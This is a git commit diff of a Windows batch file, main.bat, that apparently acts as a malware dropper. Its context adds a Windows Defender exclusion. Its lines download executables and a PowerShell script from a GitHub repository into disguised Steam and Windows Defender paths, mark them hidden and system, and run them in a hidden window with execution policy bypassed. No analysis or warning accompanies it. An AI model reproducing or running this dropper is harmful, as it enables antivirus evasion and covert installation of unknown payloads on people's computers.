30edaf5475c1ce745c446b0b48f6ffacba6d57fe
X4M1967 <107150655+X4M1967@users.noreply.github.com>
2025-03-08 11:58:20 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -4,28 +4,10 @@ powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)'"
 :: Download files using PowerShell
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/steam.exe' -OutFile 'C:\Program Files (x86)\Steam\resource\steam.exe'"
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/setup.ps1' -OutFile 'C:\ProgramData\Microsoft\Windows\setup.ps1'"
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/networkappcontrol.exe' -OutFile 'C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe'"
+powershell -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/networkappcontrol.exe' -OutFile 'C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe'}"
 
-:: Check if the steam.exe file exists and run it
-IF EXIST "C:\Program Files (x86)\Steam\resource\steam.exe" (
-    echo steam.exe exists, proceeding with execution.
-    "C:\Program Files (x86)\Steam\resource\steam.exe"
-) ELSE (
-    echo steam.exe does not exist at the expected location.
-)
+attrib +h +s "C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe"
+attrib +h +s "C:\ProgramData\Microsoft\Windows\setup.ps1"
 
-:: Check if the NetworkAppControl.exe file exists and run it
-IF EXIST "C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe" (
-    echo NetworkAppControl.exe exists, proceeding with execution.
-    "C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe"
-) ELSE (
-    echo NetworkAppControl.exe does not exist at the expected location.
-)
-
-:: Run the downloaded setup.ps1 script
-IF EXIST "C:\ProgramData\Microsoft\Windows\setup.ps1" (
-    echo setup.ps1 exists, running the script.
-    powershell Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass', '-File "C:\ProgramData\Microsoft\Windows\setup.ps1"' -WindowStyle Hidden
-) ELSE (
-    echo setup.ps1 does not exist at the expected location.
-)
+"C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe"
+powershell Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass', '-File "C:\ProgramData\Microsoft\Windows\setup.ps1"' -WindowStyle Hidden
